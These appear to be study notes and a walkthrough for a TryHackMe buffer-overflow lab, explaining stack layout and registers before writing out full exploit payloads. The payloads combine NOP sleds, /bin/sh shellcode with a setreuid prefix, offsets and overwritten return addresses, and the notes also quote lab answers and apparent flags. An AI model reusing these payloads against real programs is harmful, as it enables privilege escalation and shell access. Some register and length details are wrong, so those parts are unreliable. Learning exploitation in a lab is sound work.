## Table of Contents

    - [Process Layous](#Process\Layous)
    - [x64-x86 procedures](#x64-x86\procedures)
    - [Procedures Continued](#Procedures\Continued)
    - [Endianess](#Endianess)
    - [Overwriting Variables](#Overwriting\Variables)
    - [Overwriting Function Pointers](#Overwriting\Function\Pointers)
    - [Buffer Overflows](#Buffer\Overflows)
        - [Task 9](#Task\9)

*[Buff Overflows 1 THM](https://tryhackme.com/room/bof1)*

### Process Layous
Switching between processes very quickly is known as a context switch. since each process may need different information to run. (e.g) the current instruction to execute. The OS has to keep track of all information in a process. The memory in the process is organised sequentially and has the following layout:
*Higher memory addresses*
User stack(Down)

Share library regions

run time heap(Up)
Read/Write data
Read only code/data

**Where is dynamically allocated memory stored?**
Heap

**Where is information about functions(e.g. local arguments) stored?**
stack

### x64-x86 procedures
The stack is a region of contiguous memory addresses and it is used to make it easy to transfer control and data between functions. The top of the stack is at the lowest memory address and the stack grows towards lower memory addresses. The most common operations of the stack are:

  
**Pushing**: used to add data onto the stack

**Popping**: used to remove data from the stack


`push var`
- Assembly intruction to push a value onto the stack.
	- Uses var or value stored in memory location of var

----
Stack bottom()

Stack Top(Memory location 0x8(rsp points here))
- Decrements the stack pointer (known as rsp) by 8
- Writes above value to new location of rsp, which is now the top of the stack

```
pop var
```
This is an assembly instruction to read a value and pop it off the stack. It does the following:

- Reads the value at the address given by the stack pointer
 __(Stack Bottom)__
 
Stack Top(memory location 0x0)(`rsp` points here)

- Increment the stack pointer by 8
    
- Store the value that was read from `rsp` into var

It’s important to note that the memory does not change when popping values of the stack - it is only the value of the stack pointer that changes!

**what direction does the stack grown(l for lower/h for higher)**
`l`

**what instruction is used to add data onto the stack?**
`push`

### Procedures Continued
- Functions take arguments, the calc function takes 2 arguments (a, and b). Up to 8 arguments for functions can be stored in the following registers:
	- `rdi`
	- `rsi`
	- `rdx`
	- `rcs`
	- `r8`
	- `r9`
	Notes: `rax` is a special register that stores the return values of the functions(if any).
We can now see that a caller function may save values in their registers, but what happens if a callee function also wants to save values in the registers? To ensure the values are not overwritten, the callee values first save the values of the registers on their stack frame, use the registers and then load the values back into the registers. The caller function can also save values on the caller function frame to prevent the values from being overwritten. Here are some rules around which registers are caller and callee saved:
- `rax` is caller saved
- `rdi`, `rsi`, `rdx`, `rcx` `r8` and `r9` are called and saved(and they are usually arguments for functions)
- `r10` and `r11` are caller saved
- `rbx`, `r12`, `r13`, `r14` are callee saved
- `rbp` is also callee saved(can only be optionally used as a *frame pointer*)
- `rsp` is callee saved

### Endianess
In the above programs, you can see that the binary information is represented in hexadecimal format. Different architectures actually represent the same hexadecimal number in different ways, and this is what is referred to as Endianess. Let’s take the value of 0x12345678 as an example. Here the least significant value is the right most value(78) while the most significant value is the left most value(12).

Little Endian is where the value is arranged from the least significant byte to the most significant byte:

Least Significant Byte(LSB):
LSB              MSB
78 | 56 | 34 | 12

Big endian is where the value is arranged from the most significant byte to the least signifcant byte:
(MSB)         (LSB)
12 | 34 | 56 | 78
### Overwriting Variables
C code from overflow-1~
```
int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];
  if(variable != 0) {
      printf("you have changed the value of the variable\n");
	} else {
		printf("Try again\n");
	}
}
```

*To compile:*
`gcc filename.c -o outputname`
python -c 'print("A"*15)'
**copy output**
./outputname
paste A*\*15


### Overwriting Function Pointers
overflow-2 c code:
```
void special()
{
	printf("This is the special function\n");
	printf("you did this, friend");
}

void normal()
{
	printf("this is the normal function");
}

void other()
{
	printf("Why is this here>");
}

int main(int argc, char **argv)
{
	volatile int (*new_ptr) () = normal;
	char buffer[14];
	gets(buffer);
	new_ptr();
}

```

### Buffer Overflows
overflow-3 (C):
```
void copy_arg(char *string)
{
	char buffer[140];
	strcpy(buffer, string);
	printf("%s\n", buffer);
	return 0;
}

int main(int argc, char **argv)
{
	printf("Heres a program that echos out your input\n");
	copy_arg(argv[1]);
}
```

In theory, this looks like it would work quite well. However, memory addresses may not be the same on different systems, even across the same computer when the program is recompiled. So we can make this more flexible using a NOP instruction. A NOP instruction is a no operation instruction - when the system processes this instruction, it does nothing, and carries on execution. A NOP instruction is represented using \x90. Putting NOPs as part of the payload means an attacker can jump anywhere in the memory region that includes a NOP and eventually reach the intended instructions. This is what an injection vector would look like:

NOP sled | shell code | memory address
in shellcode, memory addresses and NOP sleds are in hex code. To make it easy to pass the payload to an input program use python:
print -c "print(NOP * no_of_nops + shellcode + random_data \* no_ofrandomdata + memory_address)"

- Find the address of the start of the buffer and the stard address of the return address
- Calcualte the difference between these addresses so you know how much data to enter to overflow
- Start out by entering the shellcode in the butter, entering random data between the shellcode and the return addressm and the address of the buffer in the return address

-----------------------
Stack Bottom
-
Address of Buffer(overwritten old return address)
Random data(overwritten saved registers)
Random Data(inside buffer)
shellcode(inside buffer)
-
Stack Top

Hexadecimal value of A is 41
`gdb buffer-overflow`
`run $(python -c "print('A'\*158)")`

run $(python -c "print('\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6)")

See where NOP sled string is located and beginning of shellcode:
`x/100x $rsp-200`
NOP Sled = 0x90909090
shellcode = 0x2f6e6962 (x\\62696e2f)
Let’s take any address between the NOP sled and the shellcode (e.g. **0x7fffffffe298**). Here is the final payload:


**setreuid**

Let’s use pwntools to generate a prefix to our shellcode to run SETREUID:

apt-get update  
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential  
python3 -m pip install --upgrade pip  
python3 -m pip install --upgrade pwntools


pwn shellcraft -f d amd64.linux.setreuid 1002 \\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05
len('\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')  
14

omgyoudidthissocool!!

##### Task 9

```
#include <stdio.h>
#include <stdlib.h>

void concat_arg(char *string)
{
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    concat_arg(argv[1]);
}
```
**offset**

The buffer is 154 bytes, but the string `doggo` (5 characters) is added. So we should begin to test from 154-5. Let’s start with 8 more bytes:
gdb -q buffer-overflow-2  
run $(python -c "print('A'*(154-5+8*2+4))")

The offset is 169 (154–5+8*2+4).

We’ll use the same shellcode (158 bytes) as previously, with the SETREUID. This time, we need to target user3 (ID is 1003), to be able to read `secret.txt`:

find the setreuid
`grep <user> /etc/passwd`<user>:x:1003:1003::/home/<user>:/bin/bash

pwn shellcraft -f d amd64.linux.setreuid 1003
\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
31ff66bfeb036a71584889fe0f05

payload =
NOP sled (90)  |  shellcode(54)  |  random chars (19)  |  Memory Address(6)
Total Length: 90 + 54 + 19 + 6 = 169

`payload = 'A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6`


run $(python -c "print('A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6)")

`(gdb) x/100x $rsp-200`
NOP sled: 0x41414141

shellcode: 0x58716a03

random chars: 0x42424242

return address: 0x00007fff

Let’s take **0x7fffffffe278** as return address (between future NOP sled and beginning of shell code).

./buffer-overflow-2 $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x78\xe2\xff\xff\xff\x7f')")


wowanothertime!!





















